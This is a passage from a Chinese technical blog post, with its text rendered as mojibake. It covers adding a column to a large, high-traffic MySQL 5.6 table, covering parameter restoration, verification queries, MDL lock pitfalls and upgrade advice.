<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.3 æ§è¡åï¼æ¢å¤éç½® + å¨ç»´åº¦éªè¯ï¼å¿åï¼</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.3.1 æ¢å¤ MySQL é»è®¤éç½®</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å°ä¸´æ¶è°æ´çåæ°æ¢å¤é»è®¤ï¼ä¿è¯æ°æ®åºé¿æè¿è¡çæ§è½åæ°æ®å®å¨æ§ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤DDLç¼å²åº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_ddl_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤æ¥å¿å·çå®å¨çº§å«ï¼ä¿è¯å®æºä¸ä¸¢æ°æ®ï¼æ ¸å¿ï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤è¯»åç¼å²åº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_read_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_write_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">8</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤èªéåºå·æ°</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_adaptive_flushing <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(0, 0, 255, 1)">ON</span>;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.3.2 DDL æ§è¡æåçå¨ç»´åº¦éªè¯</span></h4>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¡¨ç»æéªè¯ï¼ç¡®è®¤æ°å­æ®µå±æ§å®å¨ç¬¦åé¢æ</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">DESC</span> è¡¨å; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> å¿«éæ¥çå­æ®µå±æ§</span>
SHOW <span style="color: rgba(0, 0, 255, 1)">CREATE</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span> è¡¨å; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ç²¾åç¡®è®¤å®æ´å®ä¹</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">æ°æ®éªè¯ï¼ç¡®è®¤æ°å­æ®µé»è®¤å¼èµå¼æ­£å¸¸ï¼æ ç©ºå¼</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">SELECT</span> id, æ°å¢å­æ®µå <span style="color: rgba(0, 0, 255, 1)">FROM</span> è¡¨åLIMIT <span style="color: rgba(128, 0, 0, 1); font-weight: bold">20</span>; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> éæºæ¥è¯¢é»è®¤å¼</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> <span style="color: rgba(255, 0, 255, 1)">COUNT</span>(<span style="color: rgba(128, 128, 128, 1)">*</span>) <span style="color: rgba(0, 0, 255, 1)">FROM</span> è¡¨å <span style="color: rgba(0, 0, 255, 1)">WHERE</span> æ°å¢å­æ®µå <span style="color: rgba(0, 0, 255, 1)">IS</span> <span style="color: rgba(128, 128, 128, 1)">NOT</span> <span style="color: rgba(0, 0, 255, 1)">NULL</span>; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> å¨ééªè¯éç©º</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¯»åéªè¯ï¼æ¨¡æä¸å¡æä½ï¼ç¡®è®¤è¯»åæ­£å¸¸</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">UPDATE</span> è¡¨å <span style="color: rgba(0, 0, 255, 1)">SET</span> æ°å¢å­æ®µå<span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">2</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id<span style="color: rgba(128, 128, 128, 1)">=</span>xxx; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¨¡ææ´æ°</span>
<span style="color: rgba(0, 0, 255, 1)">INSERT</span> <span style="color: rgba(0, 0, 255, 1)">INTO</span> è¡¨å (id, æ°å¢å­æ®µå) <span style="color: rgba(0, 0, 255, 1)">VALUES</span> (xxx, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">3</span>); <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¨¡ææå¥</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸å¡éªè¯ï¼è§å¯ Java å¤çº¿ç¨ä¸å¡æ¥å¿ï¼ç¡®è®¤æ è¶æ¶ãæ¥éãäºå¡åæ»ç­å¼å¸¸ã</span></p>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">äºãå³é®é®é¢ä¸è§£å³æ¹æ¡æ±æ»</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">&nbsp;</span></div>
<div>
<div>
<table>
<thead>
<tr><th><span style="font-family: &quot;Microsoft YaHei&quot;">æ ¸å¿é®é¢</span></th><th><span style="font-family: &quot;Microsoft YaHei&quot;">è§£å³æ¹æ¡</span></th><th><span style="font-family: &quot;Microsoft YaHei&quot;">å³é®è¦ç¹</span></th></tr>
</thead>
<tbody>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">DDL æ§è¡æ¢ï¼å¨è¡¨æ·è´ï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ¾å¼æå®ç®åé»è®¤å¼ï¼è§¦å MySQL 5.6 æ¹éèµå¼ä¼å</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ°å¼ç±»åä¼åææä¼äº VARCHARï¼BIGINT (19) DEFAULT 0 æä¼</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">çº¿æ§æ¨ç®èæ¶åå·®å¤§</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ éæ¨ç®ï¼2000 ä¸è¡è¡¨ SSD ç£ç 5-8 åéï¼æºæ¢°ç¡¬ç 12-18 åé</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨æ¹éæ·è´ãç¼å­å½ä¸­çé«ãè¿ç»­ IO ä¼å¿éä½åä½è¡èæ¶</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">MDL éç­å¾å¯¼è´éè¡¨</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä½å³°ææ§è¡ + æ¸çéæºï¼è¸¢é¿è¿æ¥ãç»æ­¢é¿äºå¡ï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡åå¿åï¼é¿å DDL è¿å¥ Waiting for table metadata lock ç¶æ</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">é«é¢è¯»ååºæ¯èµæºç«äº</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸´æ¶åæ°è°ä¼ + è½»ééæµï¼å¯éï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä»å¼å IO/CPU ç«äºï¼æ éè¡¨é£é©ï¼ä¸å¡å»¶è¿è½»å¾®æ³¢å¨</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡æé´è¯»åéçªå¢</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">çæ§èµæºææ  + ä¸´æ¶éä½ IO å·çé¢ç</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ éä¸­æ­ DDLï¼MySQL ä¼èªå¨ééèµæºï¼ä¼åä¿éä¸å¡</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">DDL ç¶æå¤æ­å°é¾</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">éè¿ SHOW FULL PROCESSLIST æ¥ç State å</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">executing/copying to tmp table ä¸ºæ­£å¸¸æ éç¶æ</span></td>
</tr>
</tbody>
</table>
</div>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">&nbsp;</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">å­ãé¿åæåï¼ç»å¯¹ç¦æ­¢çæä½</span></h2>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¨ä¸å¡é«å³°æ / ä¸­å³°ææ§è¡ DDLï¼å³ä½¿åäºè°ä¼ï¼é«å³°æ IO å·²æ¥è¿ç¶é¢ï¼ä¼å¯¼è´ä¸å¡å»¶è¿å¤§å¹å¢å ï¼è§¦åè¶æ¶éè¯ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢æ°å¢ âéç©ºæ é»è®¤å¼â å­æ®µï¼MySQL 5.6 ä¼å¨è¡¨éè¡åå§åï¼2000 ä¸è¡è¡¨èæ¶æ°å°æ¶ï¼ä¸å ç¨å¤§éèµæºï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢ DDL ç­å¾ MDL éæ¶æ å¨äºè¡·ï¼MySQL 5.6 MDL éæ è¶æ¶ï¼éæå¨ç»æ­¢æéè¿ç¨ï¼å¦åä¼æ éé»å¡åç»­æææä½ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢ä¿®æ¹ MySQL åæ°åä¸æ¢å¤ï¼å°¤å¶æ¯<code>innodb_flush_log_at_trx_commit=2</code>ï¼ä¼éä½æ°æ®æä¹æ§ï¼å®æºå¯è½ä¸¢å¤±æ°æ®ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¨ DDL æ§è¡ä¸­æå¨ä¸­æ­è¿ç¨ï¼ä¸­æ­ä¼å¯¼è´ä¹åçæ·è´å·¥ä½ç½è´¹ï¼éæ°æ§è¡éåæ¬¡è·å MDL éï¼èæ¶ç¿»åï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¿½ç¥è¡¨ç»æéªè¯ï¼DDL è¿ç¨æ¶å¤±åï¼å¿é¡»éè¿ DESC/SHOW CREATE TABLE ç¡®è®¤å­æ®µå±æ§ï¼é¿åå®ä¹ç¼ºå¤±ã</span></li>
</ol>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãå»¶ä¼¸ä¼åï¼é¿æè§£å³æ¹æ¡</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æä¸º MySQL 5.6 ç¯å¢çä¸´æ¶æä¼è§£ï¼è¥ä¸å¡ä¾§åè®¸ï¼åçº§è³ MySQL 5.7/8.0æ¯å¤çå¤§è¡¨ DDL çç»ææ¹æ¡ï¼</span></div>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é«çæ¬æ¯æè¡¨ç»æåæ°æ®åå°ä¿®æ¹ï¼æ°å¢æ°å¼ç±»å / VARCHAR ç±»åï¼åè®¸ç©º / ç®åé»è®¤å¼ï¼å­æ®µæ¶ï¼ä»ä¿®æ¹åæ°æ®ï¼æ éå¨è¡¨æ·è´ï¼2000 ä¸è¡è¡¨èæ¶æ¯«ç§çº§ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MDL éæºå¶ä¼åï¼æ¯æéè¶æ¶ãæéæºå¶ä¼åï¼åå°éè¡¨æ¦çï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ´ä½æ§è½æåï¼æ¥è¯¢ä¼åãå¹¶åæ§å¶ãéæºå¶åä¼äº 5.6ï¼é«é¢è¯»åè¡¨çæ´ä½æ§è½æå 30%-50%ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">çææ´å®åï¼æ¯æ JSON ç±»åãçªå£å½æ°ãå¹¶è¡å¤å¶ç­æ°ç¹æ§ï¼æ»¡è¶³ä¸å¡åç»­åå±éæ±ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">åçº§æ³¨æäºé¡¹ï¼åçº§åå¨éå¤ä»½æ°æ®åºï¼éæ©ä½å³°ææ§è¡ï¼ä¸»ä»åæ¢å¯å®ç°ä¸å¡æ æç¥åçº§ï¼5.7/8.0 ä¸ 5.6 å¼å®¹æ§æé«ï¼æ®éä¸å¡ä»£ç æ éä¿®æ¹ã</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">å«ãæ»ç»</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡ MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µçå®æï¼æ ¸å¿å´ç» **âå©ç¨çæ¬ç¹æ§åä¼åãè§é¿ MDL éæºå¶åãå¹³è¡¡èµæºç«äºä¸ä¸å¡ç¨³å®æ§âå±å¼ï¼æç»å®ç°äºæ éãæ ä¸å¡æç¥ãé«æ ** çè½å°ï¼æ ¸å¿ç»è®ºå¦ä¸ï¼</span></div>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 è½æ é«çæ¬çåæ°æ®åå°ä¿®æ¹ä¼åï¼ä½éè¿æ¾å¼æå®ç®åé»è®¤å¼ï¼å¯å¤§å¹éä½ DDL æ§è¡æ¶é´ï¼æ¯ 2000 ä¸è¡è¡¨çæä¼ä¸´æ¶æ¹æ¡ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">éè¡¨çæ ¸å¿æ ¹æºå¹¶é DDL æ¬èº«ï¼èæ¯MDL éç­å¾ + é¿äºå¡é»å¡ï¼æ§è¡åæ¸çéæºæ¯é¿åå³é®ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">Online DDL çæ éç¹æ§ä»å­å¨äºMDL éè·åæååï¼executing/copying to tmp table ç¶æï¼ï¼æ­¤é¶æ®µè±ç¦»éè¡¨é£é©ï¼åç»­ä»å­å¨èµæºç«äºï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é«é¢è¯»ååºæ¯ä¸æ§è¡ DDLï¼æ éæåä¸å¡ï¼ä»éä½å³°ææ§è¡ + ä¸´æ¶åæ°è°ä¼ï¼ä¸å¡å»¶è¿ä»ä¸ºæ¯«ç§çº§âåæ¯«ç§çº§ï¼å®å¨æ æç¥ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æææä½åä¸º MySQL åç½®å½ä»¤ + å¨æåæ°è°æ´ï¼æ éå®è£é¢å¤å·¥å·ï¼ééçäº§ç¯å¢ç´§æ¥ææ¥åæ¥å¸¸å®æã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æçæ¹æ¡å¯å¤ç¨äº MySQL 5.6 ç¯å¢ä¸ææå¤§è¡¨ï¼åä¸çº§ï¼çæ®éå­æ®µæ°å¢æä½ï¼ä¸ºåçæ¬ãååºæ¯çæ°æ®åºè¿ç»´æä¾å¯è½å°çåèã</span></div>
</div>

</div>
<div id="MySignature" role="contentinfo">
    <div style="border: 2px solid yellow;">
<p style="font-weight:bold;">  æ¶é´ä»ä¿ï¼å¦æéè¯¯æ¬¢è¿æåºï¼æ¬¢è¿å¨è¯è®ºåºè®¨è®ºï¼å¦å¯¹æ¨æå¸®å©è¿è¯·ç¹ä¸ªæ¨èãå³æ³¨æ¯æä¸ä¸</p>
<p style="font-weight:bold;">  ä½èï¼<a href="http://www.cnblogs.com/xxhxs-21/" target="_blank">åå®¢å­ - åå¹´ææ¯</a></p>
<p style="font-weight:bold;">  åºå¤ï¼<a href="http://www.cnblogs.com/xxhxs-21/" target="_blank">http://www.cnblogs.com/xxhxs-21/</a></p>
<p>  æ¬æçæå½ä½èååå®¢å­å±æï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»å¨æç« é¡µé¢ç»åºåæé¾æ¥ï¼å¦åä¿çè¿½ç©¶æ³å¾è´£ä»»çæå©ã</p>
<p>  è¥åå®¹æä¾µç¯æ¨æççå°æ¹ï¼è¯·å¬åæ å¤èç³»æ¬äººï¼æ¬äººå®ç§¯æéåå¤çè§£å³ã</p>
</div>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 15:14">2026-02-02 15:13</span>&nbsp;
<a href="https://www.cnblogs.com/xxhxs-21">åå¹´ææ¯</a>&nbsp;
éè¯»(<span id="post_view_count">41</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19564624);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19564624', targetLink: 'https://www.cnblogs.com/xxhxs-21/p/19564624', title: 'MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>